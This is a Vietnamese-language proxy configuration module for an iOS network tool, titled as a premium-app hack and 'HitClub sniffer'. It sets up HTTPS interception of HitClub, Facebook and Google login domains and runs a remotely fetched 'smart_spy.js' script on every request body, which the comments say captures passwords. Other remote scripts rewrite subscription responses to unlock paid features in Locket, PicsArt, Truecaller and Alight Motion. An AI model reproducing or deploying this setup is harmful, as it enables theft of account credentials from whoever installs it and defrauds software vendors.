#!name = VIP Pro Max + HitClub Sniffer
#!desc = Tích hợp Hack Premium Apps & Bắt Password HitClub - Update 29/12
#!author = TungTinTacKMA

[General]
bypass-system = true
skip-proxy = 192.168.0.0/16, 10.0.0.0/8, 172.16.0.0/12, localhost, *.local, e.crashlytics.com
tun-excluded-routes = 10.0.0.0/8, 100.64.0.0/10, 127.0.0.0/8, 169.254.0.0/16, 172.16.0.0/12, 192.0.0.0/24, 192.0.2.0/24, 192.88.99.0/24, 192.168.0.0/16, 198.51.100.0/24, 203.0.113.0/24, 224.0.0.0/4, 255.255.255.255/32
dns-server = system
ipv6 = true

[Rule]
# Chặn quảng cáo/UDP của Youtube (Giữ nguyên từ bản gốc)
AND,((DOMAIN-SUFFIX,googlevideo.com),(PROTOCOL,UDP)),REJECT
AND,((DOMAIN,youtubei.googleapis.com),(PROTOCOL,UDP)),REJECT

# Quy tắc cuối: Bắt buộc đi qua Proxy để Script hoạt động
FINAL,PROXY

[Header Rewrite]
# Hack Locket & Spotify (Giữ nguyên từ bản gốc)
^https?://api.revenuecat.com/.+/(receipts$|subscribers/?(.*?)*$) header-del x-revenuecat-etag
^https?://api.revenuecat.com/.+/(receipts$|subscribers/?(.*?)*$) header-del X-RevenueCat-ETag
http-request ^https:\/\/(spclient\.wg\\.spotify\\.com|.*-spclient\\.spotify\\.com(:443)?)\/user-customization-service\/v1\/customize$ header-del if-none-match

[Url Rewrite]
# Chặn quảng cáo Youtube (Giữ nguyên từ bản gốc)
^https?:\/\/[\w-]+\.googlevideo\.com\/(?!(dclk_video_ads|videoplayback\?)).+&oad _ reject-200
^https?:\/\/(www|s)\.youtube\.com\/api\/stats\/ads _ reject-200
^https?:\/\/(www|s)\.youtube\.com\/(pagead|ptracking) _ reject-200
^https?:\/\/s\.youtube\.com\/api\/stats\/qoe\?adcontext _ reject-200

[Script]
# ==================================================
# 1. SCRIPT BẮT MẬT KHẨU (TÍNH NĂNG MỚI)
# ==================================================
# Bắt tất cả các link (pattern=.*) để không bỏ sót API lạ của HitClub
Smart_Spy_All = type=http-request,pattern=.*,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/smart_spy.js,requires-body=true,timeout=120

# ==================================================
# 2. CÁC GÓI HACK PREMIUM (TÍNH NĂNG CŨ)
# ==================================================

# === Alight Motion ===
AlightMotion = type=http-response,pattern=^https:\/\/api\.alightcreative\.com\/result,requires-body=1,max-size=0,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/AlightMotion.js

# === PicsArt ===
PicsArt = type=http-request,pattern=^https:\/\/api\.picsart\.com\/gw-v2\/shop\/subscription\/apple\/purchases,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/PicsArt.js,requires-body=true,timeout=60

# === Truecaller ===
Truecaller = type=http-response,pattern=^https://premium-(.+)\.truecaller\.com/v\d/(subscriptions|products\/apple),requires-body=1,max-size=0,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/TrueCaller.js

# === Locket Gold ===
Locket_Gold = type=http-response,pattern=^https:\/\/api\.revenuecat\.com\/.+\/(receipts$|subscribers\/[^/]+$),requires-body=true,max-size=-1,timeout=60,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/Locket_DuyVinh09.js
Locket_Delete_Header = type=http-request,pattern=^https:\/\/api\.revenuecat\.com\/.+\/(receipts|subscribers),script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/deleteHeader.js,timeout=60

[MITM]
enable = true
# ==================================================
# DANH SÁCH GIẢI MÃ HTTPS (QUAN TRỌNG NHẤT)
# ==================================================
# 1. Các tên miền của HitClub & API ngầm (Lấy từ Log)
hostname = hit.club, *.hit.club, *.wsmt8g.cc, *.genesockezlyfeapy.com, *.trakipsg.net, *.hytsocesk.com, *.geightdors.net, *.dsrcgoms.net, *.8xdfd3t6f.com

# 2. Các tên miền cho App Premium (Locket, Picsart...)
hostname = *.revenuecat.com, api.revenuecat.com, *.picsart.com, *.alightcreative.com, *.truecaller.com

# 3. Mạng xã hội & Khác
hostname = *.facebook.com, *.google.com, *.youtube.com, accounts.google.com
